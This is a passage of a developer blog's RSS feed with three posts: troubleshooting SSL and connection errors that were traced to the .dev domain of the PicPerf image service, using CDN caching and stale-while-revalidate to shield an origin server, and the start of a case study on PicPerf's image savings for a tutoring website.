stale. Hopefully, they&apos;re helpful to others who run into issues one day.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Disclaimer: I’m far from an expert DNS, networking, and firewalls. If you see any incorrect assumptions, here, or have any helpful insight on the problem, feel free to butt in!&lt;/em&gt;&lt;/p&gt;&lt;p&gt;I purchased picperf.dev back in June and immediately began using it to power both the marketing site, as well as every image request being proxied through it. For example, a URL like this would intercept the image and return an optimized version: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;https://picperf.dev/https://some-domain.com/my-image.jpeg&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For the vast majority of visitors, everything was working flawlessly and I was pretty excited about PicPerf&apos;s momentum. That excitement only grew when &lt;a href=&quot;https://laravel-news.com/?ref=cms.macarthur.me&quot;&gt;Laravel News&lt;/a&gt; (whom I&apos;ve followed for years) started using it to optimize images on their redesigned website. Things were good. &lt;/p&gt;&lt;h3&gt;Sporadic Connectivity Issues&lt;/h3&gt;&lt;p&gt;But then, a couple of reports started to come in. For a small number of users, a hodgepodge of errors were being thrown when images were requested, resulting in &lt;em&gt;no&lt;/em&gt; images being rendered on LN&apos;s site. They weren&apos;t even consistent, including things like &lt;code&gt;ERR_SSL_PROTOCOL_ERROR&lt;/code&gt;, &lt;code&gt;ERR_CONNECTION_RESET&lt;/code&gt;, and &lt;code&gt;SSL_ERROR_ZERO_RETURN&lt;/code&gt;.  Here&apos;s one of the screenshots showing what was going on. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-20.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1502&quot; height=&quot;1207&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-20.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-20.png 1000w, https://cms.macarthur.me/content/images/2023/10/image-20.png 1502w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;It was a mess. And very odd because the errors seemed to go away when switching from a WiFi connection to mobile data. I was never personally able to replicate the issue, no matter what browser I was using or the network to which I was connected. &lt;/p&gt;&lt;h2&gt;Troubleshooting Begins&lt;/h2&gt;&lt;p&gt;The internet lacked many resources on what might be happening. The closest example of a similar problem I came across &lt;a href=&quot;https://community.cloudflare.com/t/worker-is-not-available-from-certain-providers-in-the-us/555763?ref=cms.macarthur.me&quot;&gt;was here&lt;/a&gt;, but even that wasn&apos;t happily resolved. My head immediately gravitated toward a couple different potential causes, and I began to dig in there. &lt;/p&gt;&lt;h3&gt;Using a Custom Worker Domain&lt;/h3&gt;&lt;p&gt;First, I thought it might be related to how I had configured the domain&apos;s DNS and set it up with my Cloudflare Worker. At the time, I was using worker routes to catch every request: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-21.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1522&quot; height=&quot;1056&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-21.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-21.png 1000w, https://cms.macarthur.me/content/images/2023/10/image-21.png 1522w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But I thought that I had possibly missed something, causing the DNS to not play nicely with particular firewalls and networks. So, I configured a custom domain for the worker instead. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-22.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1484&quot; height=&quot;574&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-22.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-22.png 1000w, https://cms.macarthur.me/content/images/2023/10/image-22.png 1484w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The benefit to this approach is that my worker becomes my origin – it&apos;s no longer just intercepting requests as they attempt to reach another destination. And on top of that, all of the DNS is managed by Cloudflare, so there&apos;d be no chance of me screwing it up. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-23.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1438&quot; height=&quot;198&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-23.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-23.png 1000w, https://cms.macarthur.me/content/images/2023/10/image-23.png 1438w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;I was optimistic this would take care of the issue. But it did not. After some back &amp;amp; forth with the person experiencing the issue first-hand, nothing had changed. &lt;/p&gt;&lt;h3&gt;Blowing Up SSL Certificates&lt;/h3&gt;&lt;p&gt;My next thought was that my SSL certificates were in an odd state, causing hiccups before the DNS could ever successfully resolve. In my &quot;edge certificates&quot; settings, I saw several of them set up after moving to a custom worker domain. I honestly wasn&apos;t that familiar with why each was needed: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-24.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1622&quot; height=&quot;760&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-24.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-24.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/10/image-24.png 1600w, https://cms.macarthur.me/content/images/2023/10/image-24.png 1622w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;So, I blew them all away generated a single new one. On my end, just as before, it worked fine: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-25.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1346&quot; height=&quot;434&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-25.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-25.png 1000w, https://cms.macarthur.me/content/images/2023/10/image-25.png 1346w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;By this time, I was already talking with a couple of other people who were having similar issues. They were even seeing other errors new to the mix, like &lt;code&gt;ERR_CERT_COMMON_NAME_INVALID&lt;/code&gt;.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-26.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1798&quot; height=&quot;829&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-26.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-26.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/10/image-26.png 1600w, https://cms.macarthur.me/content/images/2023/10/image-26.png 1798w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Regardless, I was optimistic my new SSL certificate would finally put this problem to rest, but no. It did not. &lt;/p&gt;&lt;h2&gt;Remembrance: The .dev TLD is Relatively New&lt;/h2&gt;&lt;p&gt;As I was talking to people and trying to get to the root of this, a few had said that this &lt;em&gt;must&lt;/em&gt; be an issue with the user&apos;s network and/or firewall, and as far as I could tell, that checked out. There was no evidence of my worker even receiving these failed requests. It was crapping out at the DNS resolution stage. But reports (still very few of them, relative to the amount of traffic running through PicPerf) were still coming in every so often, and I couldn&apos;t swallow that this was an isolated quirk for a few networks. I was a loss. &lt;/p&gt;&lt;p&gt;So, I mentally backed up and looked at the domain: picperf&lt;strong&gt;&lt;em&gt;.dev&lt;/em&gt;&lt;/strong&gt;. I remembered when &lt;a href=&quot;https://blog.google/technology/developers/hello-dev/?ref=cms.macarthur.me&quot;&gt;Google made the .dev TLD available for purchase&lt;/a&gt; back in 2019. It personally impacted me because I was using it for local WordPress development at the time, and when .dev became a first-class TLD, I moved things over to .test instead. It wasn&apos;t just me - it was a pretty common practice. &lt;a href=&quot;https://medium.engineering/use-a-dev-domain-not-anymore-95219778e6fd?ref=cms.macarthur.me&quot;&gt;Many firms used .dev&lt;/a&gt; for their development and staging environments.&lt;/p&gt;&lt;p&gt;Keep in mind: I&apos;m pretty unexperienced when it comes to this level of stuff. But it seemed like the root of the issue could be one of two things: &lt;/p&gt;&lt;h3&gt;#1: F&lt;strong&gt;irewalls possibly still don&apos;t trust the .dev TLD.&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;Maybe some of them are still stuck in the past, exercising rules intended to prevent malicious activity. &lt;/p&gt;&lt;p&gt;Totally made-up (but feasible) scenario: I&apos;m a bad guy who hates Your Company™, and I knew there&apos;s a chance your development environment is on yourcompany.dev. I might&apos;ve purchased that TLD as soon as I got the chance. I&apos;d stick some bad code on there to steal all the secrets and do other bad-guy things. Without targeted firewall rules in place, an unsuspecting team member could navigate to that domain and BAM – I got &apos;em. It seems plausible.&lt;/p&gt;&lt;h3&gt;#2. Local development environments still mess with the .dev domain (more likely?).&lt;/h3&gt;&lt;p&gt;Whether it&apos;s intentional or the remains of a no-longer-used setup, some development environments set up a local DNS service to intercept requests to a particular TLD. Laravel Valet is just one example, and &lt;a href=&quot;https://github.com/laravel/valet/issues/431?ref=cms.macarthur.me&quot;&gt;it&apos;s something they explicitly addressed a long time ago&lt;/a&gt;. To verify it, I tried to manually set the TLD used by Valet to .dev, and was met with this warning:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-27.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;95&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-27.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-27.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/10/image-27.png 1600w, https://cms.macarthur.me/content/images/size/w2400/2023/10/image-27.png 2400w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;I went for it anyway, and sure enough, I could no longer access picperf.dev after committing the change: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-29.png&quot; alt=&quot;network error when requesting picperf.dev&quot; loading=&quot;lazy&quot; width=&quot;683&quot; height=&quot;61&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-29.png 600w, https://cms.macarthur.me/content/images/2023/10/image-29.png 683w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Being that this issue came up from people within the Laravel community, it wouldn&apos;t surprise me if this had been the cause, at least for a few of them. (Thanks to &lt;a href=&quot;https://twitter.com/ericlbarnes/status/1719046228409774271?ref=cms.macarthur.me&quot;&gt;Eric for calling this out&lt;/a&gt;.)&lt;/p&gt;&lt;h2&gt;TLD Problem: Confirmed&lt;/h2&gt;&lt;p&gt;Regardless of the exact source, I moved forward with assuming it was all related to my TLD. As a test, I connected my worker to a subdomain on jamcomments.com. After hours of troubleshooting and many back &amp;amp; forth messages with multiple people, &lt;strong&gt;the issue went away entirely&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;So, I took it to the next level and purchased picperf.io. A part of me was concerned that since the domain would be so new, I&apos;d run into other firewall problems. But nope – everything worked flawlessly. Again. Needless to say, I&apos;m using .io as the primary TLD, and redirecting all .dev traffic there now. It&apos;s good to see things calm down.&lt;/p&gt;&lt;h2&gt;The Takeaway: Slow Your TLD Roll&lt;/h2&gt;&lt;p&gt;It goes without saying, but moving forward, I&apos;m gonna be a bit more hesitant about purchasing new-ish TLDs, especially if I&apos;m building a product that needs to be maximally accessible at great scale. I initially chose a .dev domain because it sounded cool and I was still bought into the hype of it being made available. Not gonna that mistake again, even if the problem was unique to the engineering community who may have old, weird demons crawling through their machines.&lt;/p&gt;&lt;p&gt;At this point, I&apos;m exhausted and still a little dazed, but more than anything, I&apos;m just glad the debacle is over.&lt;/p&gt;&lt;p&gt;I&apos;d be remiss if I didn&apos;t give a hat tip to &lt;a href=&quot;https://newsletter.ericlbarnes.com/?ref=cms.macarthur.me&quot;&gt;Eric Barnes&lt;/a&gt; w/ Laravel News and the handful of other guys who helped me troubleshoot this. It&apos;s one of those problems that probably wouldn&apos;t have been caught if it weren&apos;t being used at scale, and they were all incredibly gracious and patient as we figured it out. &lt;/p&gt;</content:encoded></item><item><title>Don&apos;t Let Visitors Know Your Origin Server Exists</title><link>https://macarthur.me/posts/hidden-origin</link><guid isPermaLink="true">https://macarthur.me/posts/hidden-origin</guid><pubDate>Sun, 29 Oct 2023 14:29:33 GMT</pubDate><content:encoded>&lt;p&gt;In its heyday, I was entranced by the Jamstack – particularly by its &lt;a href=&quot;https://web.archive.org/web/20210817073835/https://jamstack.org/why-jamstack/&quot;&gt;promise of performance&lt;/a&gt;&lt;em&gt;.&lt;/em&gt; I knew old-school HTTP caching existed, but I relegated it to being an unnecessarily hard thing boomers cared about. I had moved beyond, believing that a statically generated site is inherently more performant than a dynamic one. No exceptions.&lt;/p&gt;&lt;p&gt;That naiveté waned as smart people started sharing more about the fundamentals of HTTP caching, and why &lt;a href=&quot;https://twitter.com/kentcdodds/status/1344296633962434560?lang=en&amp;amp;ref=cms.macarthur.me&quot;&gt;there&apos;s nothing technical holding back&lt;/a&gt; a &quot;traditional&quot; site from being just as fast as a static one.&lt;/p&gt;&lt;p&gt;The scales started to fall. I started to realize that what matters more to performance than the architecture you choose are the principles you build around.&lt;/p&gt;&lt;p&gt;As it relates to the performance of content-heavy sites (blogs, marketing sites, etc.), the principle is that &lt;strong&gt;your users should never need to request anything directly from your origin server&lt;/strong&gt;. They should have no reason to believe it exists, interacting with nothing more than some form of a middleman, like a CDN. Fortunately, this is getting easier to pull off, no matter how your site is architected.&lt;/p&gt;&lt;h2&gt;Typical CDN Caching: Good, not Great&lt;/h2&gt;&lt;p&gt;The most common way sites leverage CDN caching is fine, but it&apos;s insufficient for fully guarding your origin from needing to build a fresh response.&lt;/p&gt;&lt;p&gt;Here&apos;s a typical setup. A CDN acts as a reverse proxy between a visitor&apos;s browser and the server. When a request comes in, the source of the response depends on whether it&apos;s already cached and considered &quot;fresh.&quot; If it is, the origin server won&apos;t be touched. If not, it&apos;ll process a new response and use it to both serve the user and replenish the cache.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-18.png&quot; alt=&quot;flow chart for typical caching strategy&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;786&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Many servers set a &quot;Cache-Control&quot; header crudely similar to this, and CDNs will usually respect that header.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Cache-Control: public, max-age=3600&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this case, assets will be considered &quot;fresh&quot; in the cache for an hour. After that, it&apos;ll head back to origin for a new response. It&apos;s a simple pattern to wrap your head around, and good for enforcing strict cache windows, but it also has some inherent challenges.&lt;/p&gt;&lt;h3&gt;You sacrifice the occasional user.&lt;/h3&gt;&lt;p&gt;With a caching strategy like this, the CDN is like an apathetic high school student: lazy and reactive. Instead of preemptively updating the cache on its own, it cares about content staleness only when a request is received. And then, if it&apos;s expired (after 3,601 or more seconds, based on the example above), the visitor pays the price. Here&apos;s a diagram of that &quot;stale cache&quot; scenario.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-15.png&quot; alt=&quot;sequence diagram for stale cache request&quot; loading=&quot;lazy&quot; width=&quot;1816&quot; height=&quot;736&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That unfortunate visitor needs to wait for a &lt;em&gt;fully synchronous&lt;/em&gt; trip all the way back to the origin server. It won&apos;t impact a &lt;em&gt;lot&lt;/em&gt; of people, and the cost will depend on the performance of your server. But still, it sacrifices the experience of the occasional visitor by design. And if you really pride yourself on consistent, performant experiences, it shouldn&apos;t sit with you well.&lt;/p&gt;&lt;h3&gt;CDNs are unreliable friends. &lt;/h3&gt;&lt;p&gt;I remember feeing a little disappointed when I realized this: telling a CDN to cache your assets with a certain &quot;Cache-Control&quot; header does &lt;em&gt;not&lt;/em&gt; guarantee they&apos;ll actually respect it. Take, for example the following header: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;Cache-Control: public, max-age: 3600&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s not an imperative for a CDN to cache your asset for an hour. It&apos;s more of a &lt;em&gt;plea&lt;/em&gt; for them to cache it that long if they&apos;re willing. There&apos;s no obligation for them to respect that timeframe, and depending on your traffic and overall priority, your assets may be purged without notice (a practice referred to as &quot;cache eviction&quot;). I like how &lt;a href=&quot;https://twitter.com/JavaSquip/status/1707748893155377317?ref=cms.macarthur.me&quot;&gt;Sean Roberts puts it&lt;/a&gt;: &quot;it’s a giant popularity contest inside the cache store.&quot; And it&apos;s not really a secret either. &lt;a href=&quot;https://blog.cloudflare.com/introducing-cache-reserve?ref=cms.macarthur.me#why-is-getting-a-100-cache-ratio-difficult&quot;&gt;Cloudflare&apos;s been open about it&lt;/a&gt;, for example: &lt;/p&gt;&lt;blockquote&gt;If cache storage in a certain region is full, our network avoids imposing these inefficiencies on our customers by evicting less-popular content from the data center and replacing it with more-requested content.&lt;/blockquote&gt;&lt;p&gt;I felt this pain while attempting to move from a static site to a dynamic one with good cache headers. I was using Cloudflare&apos;s free tier and I also wasn&apos;t getting a lot of traffic. As a result, I frequently needed to wait for fresh requests to resolve due to surprise cache evictions. It was frustrating, and one of the reasons &lt;a href=&quot;https://macarthur.me/posts/boarded-the-ssg-train-again?ref=cms.macarthur.me&quot;&gt;I opted to keep using a fully static approach&lt;/a&gt;.&lt;/p&gt;&lt;h2&gt;Some Good Options for Guarding Your Origin&lt;/h2&gt;&lt;p&gt;With these difficulties in mind, there are still some good ways to prevent your origin server from ever directly serving a fresh request to a user. And in my opinion, they&apos;re becoming so accessible that it&apos;s hard to justify &lt;em&gt;not&lt;/em&gt; using one of them for maximum performance.&lt;/p&gt;&lt;h3&gt;Statically Generate Your Site&lt;/h3&gt;&lt;p&gt;It&apos;s obvious, but still a great option. With all of your site&apos;s content being generated in advance, you never need to worry about a slow request/response cycle punishing a visitor or threatening your time-to-first-byte. Your &quot;origin&quot; is whatever machine runs your &lt;code&gt;build&lt;/code&gt; command on each deployment. After that, it&apos;s out of the picture.&lt;/p&gt;&lt;p&gt;CDN cache eviction may still happen, but when it does, it just means serving ready-to-go files from a file system. These &quot;cold&quot; responses might not be globally distributed, but they&apos;re still measurably more performant. It&apos;s no surprise there are so many resources out there on &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html?ref=cms.macarthur.me&quot;&gt;hosting static sites directly from an S3 bucket&lt;/a&gt;. I even use Cloudflare&apos;s R2 product to served uncached image requests with &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;. Trust me. It&apos;s fast. &lt;/p&gt;&lt;p&gt;It&apos;s worth mentioning that this option doesn&apos;t come without its challenges either. The most common one is ensuring that when you update your content, both your generated content &lt;em&gt;and&lt;/em&gt; any CDN in front of it gets purged at the same time. If not, there&apos;ll be some annoying inconsistencies between the source of your content (a CMS), your static files, and whatever a CDN is still serving to your visitors. Thankfully, if you&apos;re using a platform like Vercel or Netlify, much of that hassle is abstracted away (although, there&apos;s &lt;a href=&quot;https://macarthur.me/posts/more-aggressive-cache-headers?ref=cms.macarthur.me&quot;&gt;probably still room for improvement&lt;/a&gt;). &lt;/p&gt;&lt;h3&gt;Use &lt;code&gt;stale-while-revalidate&lt;/code&gt; w/ a Persistent Backup Cache&lt;/h3&gt;&lt;p&gt;If you&apos;re using a more orthodox framework to serve content, there are some highly useful tools to make origin protection a lot easier and more reliable. &lt;/p&gt;&lt;p&gt;The &lt;code&gt;stale-while-revalidate&lt;/code&gt; cache directive is a part of that. It allows you to set a &lt;code&gt;max-age&lt;/code&gt; like usual, but you can also give the CDN a timeframe in which the stale version is be served &lt;em&gt;while a fresh version is regenerated &amp;amp; cached in the background&lt;/em&gt;. Consider this header: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;Cache-Control: max-age=300, stale-while-revalidate=604800&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this in place, the origin server tells the CDN that the contents will go stale after only five minutes. But this doesn&apos;t mean the next user will need to wait for a request back to origin. If a request comes in for the next week after that (604,800 seconds), &lt;em&gt;the stale contents will be served from the cache, &lt;/em&gt;all while it&apos;s made &quot;fresh&quot; for the next user. Our diagram ends up looking more like this: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-16.png&quot; alt=&quot;sequence diagram for &apos;stale-while-revalidate&apos; request&quot; loading=&quot;lazy&quot; width=&quot;1814&quot; height=&quot;742&quot; /&gt;&lt;/figure&gt;&lt;p&gt;It&apos;s a great end result: as long as there&apos;s &lt;em&gt;any&lt;/em&gt; request that comes in within that week, every user will get a cached response, even as content continues to change. &lt;/p&gt;&lt;p&gt;Depending on your needs, you can beef this up too. Let&apos;s say you have content you update very frequently, but you still want to prevent your origin from serving a visitor directly, and you&apos;re a little flexible in how &quot;strict&quot; those updates are propogated. You could use the &lt;code&gt;stale-while-revalidate&lt;/code&gt; directive to make the contents stale after only a minute, but be willing to serve them for up to a year if another request comes in (and thereby updating the cache for the next user): &lt;/p&gt;&lt;pre&gt;&lt;code&gt;Cache-Control: max-age=60, stale-while-revalidate=
31536000&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With a strategy like this, you&apos;re effectively serving dynamic content at static speeds. Of course, much of the value here is lost in the event of a cache purge. And that&apos;s why I personally wouldn&apos;t reach for SWR in combination with a plain, ol&apos; CDN. Thankfully, though, that&apos;s becoming more solvable as providers offer more permanent, persistent caching products. &lt;/p&gt;&lt;p&gt;One of them is Cloudflare&apos;s Cache Reserve. When it&apos;s enabled, all of your cacheable content will be stored in R2 bucket as a sort of backup, persistent cache, and it&apos;ll be tapped whenever the first-class CDN cache comes up dry. The default TTL for this content is 30 days, but from my understanding (and suggested by &lt;a href=&quot;https://developers.cloudflare.com/cache/advanced-configuration/cache-reserve/?ref=cms.macarthur.me&quot;&gt;their own documentation&lt;/a&gt;, you&apos;re able to &quot;as long as you want,&quot; making it a great companion for long-tailed, aggressive cache headers. &lt;/p&gt;&lt;p&gt;Also worth mentioning is Bunny.net&apos;s &lt;a href=&quot;https://bunny.net/cdn/perma-cache/?ref=cms.macarthur.me&quot;&gt;Perma-Cache&lt;/a&gt;, which touts a very similar model to Cache Reserve. Cacheable contents are stored in storage buckets replicated across a number of locations, and when the primary CDN has been purged, those assets are accessed. As far as I can tell, Bunny doesn&apos;t support the standard &lt;code&gt;stale-while-revalidate&lt;/code&gt; directive, but they do offer a proprietary version of the same functionality: &quot;&lt;a href=&quot;https://bunny.net/cdn/perma-cache/?ref=cms.macarthur.me&quot;&gt;Stale Cache Delivery&lt;/a&gt;.&quot;&lt;/p&gt;&lt;p&gt;Regardless of the route you go, it&apos;s encouraging to see more options out there for combining the the model of serving stale content while revalidated occurs in the background with long-term caching not at risk of unexpected eviction. &lt;/p&gt;&lt;h3&gt;Cache Static HTML on Your Origin&lt;/h3&gt;&lt;p&gt;If you don&apos;t want to rely so much on third parties to store your cached content remotely, there&apos;s another option on the table – locally storing static HTML on origin itself. &lt;/p&gt;&lt;p&gt;This approach is fairly common in the WordPress space. Caching plugin&apos;s like &lt;a href=&quot;https://wordpress.org/plugins/wp-super-cache/?ref=cms.macarthur.me&quot;&gt;WP Super Cache&lt;/a&gt; will store static HTML in a particular directory and serve it when a request comes in. You&apos;ll end up seeing something like this your WordPress directory tree:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-19.png&quot; alt=&quot;wp-content directory with cached HTML&quot; loading=&quot;lazy&quot; width=&quot;1250&quot; height=&quot;786&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Those static files aren&apos;t globally distributed like a CDN would do, but it greatly reduces the duration of the request because the server isn&apos;t required to build the content from scratch. &lt;/p&gt;&lt;p&gt;The &lt;code&gt;stale-while-revalidate&lt;/code&gt; model is also employed by many of these plugins, albeit under a different label. WP Super Cache, for example, refers to it as &quot;cache rebuild.&quot; When it&apos;s enabled, stale content will be served immediately, while fresh content is generated in the background: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-14.png&quot; alt=&quot;WP Super Cache&apos;s &amp;quot;cache rebuild&amp;quot; setting&quot; loading=&quot;lazy&quot; width=&quot;1338&quot; height=&quot;132&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That&apos;s highly WordPress-specific, but the approach could be leveraged in any sort of application if needed. The point is that you&apos;re yet again shielding your origin server from directly serving a request from scratch.&lt;/p&gt;&lt;h2&gt;Uphold the Principle, but Don&apos;t Go Crazy&lt;/h2&gt;&lt;p&gt;These are just a few good methods for effective origin shielding. There are a million more you could go nuts with, but at some point, you&apos;ll need to weigh the complexity against the potential benefits. For example, I can see someone obsessed with edge functions (me) setting up a Redis instance with entries caching every the markup of every page. &quot;Cool&quot;, but possibly not worth the squeeze when there are more boring but effective options on the table. &lt;/p&gt;&lt;p&gt;Like I said: what&apos;s more important is adhering to the principle. Whether it&apos;s an SSG, Laravel application, or an Express server running on a Raspberry Pi in your garage, don&apos;t allow your user to ever bear the burden of a full request to origin. Give &apos;em no reason to believe it even exists. &lt;/p&gt;</content:encoded></item><item><title>PicPerf&apos;s Impact on Jane Ross Tutoring&apos;s Website</title><link>https://macarthur.me/posts/picperfs-impact-on-jane-ross-tutoring</link><guid isPermaLink="true">https://macarthur.me/posts/picperfs-impact-on-jane-ross-tutoring</guid><pubDate>Tue, 24 Oct 2023 03:06:09 GMT</pubDate><content:encoded>&lt;p&gt;For decades, &lt;a href=&quot;https://janerosstutoring.com/?ref=cms.macarthur.me&quot;&gt;Jane Ross Tutoring&lt;/a&gt; has been serving students by providing tutoring for a wide range of subjects and tests, particularly in the college admissions space.&lt;/p&gt;&lt;p&gt;The website&apos;s home page includes a number of headshots from students who were helped by their efforts, some iconography, and a large hero image at the top of the page. This meant that approximately 1,600kb in image weight was downloaded to a user&apos;s device when they visited the page. All of these images were being loaded straight from the WordPress server, and they were cached for only a few weeks. So, if anyone visited a month later and the site hadn&apos;t changed, all of that data would still be downloaded again.&lt;/p&gt;&lt;p&gt;By simply activating PicPerf, a significant portion of that overhead was eliminated from the home page.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-1.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;800&quot; height=&quot;448&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-1.png 600w, https://cms.macarthur.me/content/images/2023/10/image-1.png 800w&quot; /&gt;&lt;/figure&gt;&lt;h2&gt;Enabling PicPerf&lt;/h2&gt;&lt;p&gt;As mentioned, Jane Ross Tutoring’s website is built on WordPress, so setting up PicPerf was extremely simple: install and activate the plugin.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-2.png&quot; alt=&quot;activating the PicPerf WordPress plugin&quot; loading=&quot;lazy&quot; width=&quot;1930&quot; height=&quot;208&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-2.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-2.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/10/image-2.png 1600w, https://cms.macarthur.me/content/images/2023/10/image-2.png 1930w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Upon activation, the the plugin prefixed each image URL on the page with &lt;code&gt;https://picperf.dev&lt;/code&gt; — including those found in &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tags, inline styles, and &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; tags. When the page was reloaded, each of those images was optimized and cached in the background. Reloading the page once again resulted in freshly optimized and cached images being returned.&lt;/p&gt;&lt;h2&gt;The Impact&lt;/h2&gt;&lt;p&gt;With PicPerf at the helm, images were now being served in an optimized WebP format, cached and ready to go. This time, each vistor would reuse that same optimized image every time a repeat visit was made. So, while being lighter, there’d also be fewer requests back to the server for any user who came back.&lt;/p&gt;&lt;p&gt;The decrease in amount of image weight on the home page was staggering — a ~78% drop:&lt;/p&gt;&lt;h4&gt;Change in Page Weight&lt;/h4&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Stage&lt;/th&gt;&lt;th&gt;Total Home Page Image Weight&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Before&lt;/td&gt;&lt;td&gt;1.6MB (1600kb)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;After&lt;/td&gt;&lt;td&gt;344kb&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Impact&lt;/td&gt;&lt;td&gt;&lt;strong&gt;~78.5% less image weight&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2&gt;Performance Tools Noticed&lt;/h2&gt;&lt;p&gt;On top of that, Google’s PageSpeed tool also took notice of the change. Prior to activating PicPerf, the following notice appeared in the report, suggesting that nearly a half second of load time was on the table just by optimizing images.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-3.png&quot; alt=&quot;PageSpeed suggesting modern image formats&quot; loading=&quot;lazy&quot; width=&quot;1952&quot; height=&quot;374&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-3.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-3.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/10/image-3.png 1600w, 